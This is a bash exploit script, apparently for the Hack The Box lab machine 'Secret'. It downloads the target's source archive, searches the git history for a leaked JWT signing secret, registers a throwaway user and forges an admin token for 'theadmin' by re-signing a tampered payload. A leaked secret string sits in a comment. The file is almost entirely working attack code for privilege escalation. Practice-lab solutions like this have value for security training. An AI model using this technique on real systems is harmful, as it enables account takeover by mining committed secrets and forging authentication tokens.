#!/bin/bash

if [ -z ./files.zip ];
then
    wget http://secret.htb/download/files.zip 2>&1 | grep -v "." | tr "\n" "\r";
fi

if [ -z ./local-web ];
then
    unzip files.zip;
fi

cd ./local-web/;
cat .git/logs/refs/heads/master | awk '{print $2}' | 
while read commit;
do
    if [[ `git ls-tree $commit | sed -n 1p | grep -c ".env"` == 1 ]];
    then
        h=$(git ls-tree $commit | sed -n 1p | awk '{print $3}')
        if git cat-file -p $h | grep "TOKEN_SECRET = secret";
        then
            continue
        else
            #secret: "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
            secret=$(git cat-file -p $h | sed -n 2p | cut -d' ' -f3);

            # Register user
			curl -X POST http://secret.htb:3000/api/user/register -H 'Content-Type: application/json' -d '{"name": "xxxxxx", "email": "xxxxxx@gmail.com", "password": "1234567890"}' 2>&1 | grep -v "."

			# Login user and get user_token
			user_token=$(curl -X POST http://secret.htb:3000/api/user/login -H 'Content-Type: application/json' -d '{"email": "xxxxxx@gmail.com", "password": "1234567890"}' 2>&1 | tail -1)

			# Modify user_token
			payload=$(echo $(echo $user_token | cut -d '.' -f2 | openssl base64 -d -A) | tr "\n" "}" | sed 's/\}\}/\}/' | sed 's/xxxxxx\@gmail\.com/theadmin/' | sed 's/xxxxxx/theadmin/' | base64 -w0 | sed 's/\+/-/' | sed -E 's/=+$//')
			head_payload=$(echo -n "$(echo -n $user_token | cut -d '.' -f1).$payload")
			#head_payload="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRoZWFkbWluIn0"
			signature=$(echo -n "$head_payload" | openssl dgst -binary -sha256 -hmac "$secret" | base64 -w0 | sed 's/\+/-/g' | sed 's/\//_/g' | sed -E 's/=+$//')
			admin_token="$head_payload.$signature"

            echo $admin_token
            break
        fi
    fi
done